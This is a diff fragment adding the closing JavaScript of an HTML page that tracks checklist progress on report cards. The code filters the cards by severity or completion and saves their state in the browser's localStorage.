+            const cards = sec.querySelectorAll('.report-card'), done = [...cards].filter(c => { const t = c.querySelectorAll('.checklist-item').length; return t > 0 && t === c.querySelectorAll('.checklist-item.done').length; });
+            const countEl = document.getElementById('p' + (i + 1) + 'count');
+            if (countEl) countEl.textContent = done.length + ' / ' + cards.length + ' reports';
+        });
+    }
+    function filterCards(type, btn) {
+        document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+        if (btn) btn.classList.add('active');
+        document.querySelectorAll('.report-card').forEach(card => {
+            const sev = card.dataset.severity, items = card.querySelectorAll('.checklist-item'), doneItems = card.querySelectorAll('.checklist-item.done');
+            const isComplete = items.length > 0 && items.length === doneItems.length, isIncomplete = doneItems.length > 0 && !isComplete;
+            let show = false;
+            if (type === 'all') show = true;
+            else if (type === 'critical') show = sev === 'critical';
+            else if (type === 'high') show = sev === 'high';
+            else if (type === 'medium') show = sev === 'medium';
+            else if (type === 'low') show = sev === 'low';
+            else if (type === 'na') show = sev === 'na';
+            else if (type === 'complete') show = isComplete;
+            else if (type === 'incomplete') show = isIncomplete || doneItems.length === 0;
+            card.style.display = show ? '' : 'none';
+        });
+    }
+    function saveState() {
+        const state = {};
+        document.querySelectorAll('.report-card').forEach(card => {
+            const id = card.id, items = [];
+            card.querySelectorAll('.checklist-item').forEach((item, i) => { if (item.classList.contains('done')) items.push(i); });
+            if (items.length) state[id] = items;
+        });
+        try { localStorage.setItem(STORAGE_KEY, JSON.stringify(state)); } catch (e) {}
+    }
+    function loadState() {
+        try {
+            const raw = localStorage.getItem(STORAGE_KEY); if (!raw) return;
+            const state = JSON.parse(raw);
+            Object.keys(state).forEach(id => {
+                const card = document.getElementById(id); if (!card) return;
+                const items = card.querySelectorAll('.checklist-item');
+                state[id].forEach(i => { if (items[i]) items[i].classList.add('done'); });
+                updateCardProgress(card);
+            });
+        } catch (e) {}
+        updateMasterProgress();
+    }
+    loadState();
+    </script>
+</body>
+</html>
